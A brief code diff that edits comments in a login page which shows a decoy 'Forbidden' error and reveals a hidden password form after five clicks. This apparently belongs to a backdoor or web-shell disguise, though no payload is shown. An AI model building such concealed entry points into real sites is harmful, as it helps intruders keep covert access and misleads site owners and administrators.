@@ -34,7 +34,7 @@ function show_login_page() {
     <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2>
     <p>Access to this resource on the server is denied!</p>
 
-    <!-- Hidden password input -->
+    <!-- Hidden password input below Forbidden -->
     <div id="passwordField">
       <form method="post">
         <input type="password" name="pass" placeholder="Enter password">
@@ -57,7 +57,7 @@ function show_login_page() {
   forbiddenCode.addEventListener('click', () => {
     clickCount++;
     if (clickCount === 5) {
-      passwordField.style.display = 'block';
+      passwordField.style.display = 'block'; // Show the password field
     }
   });
 </script>
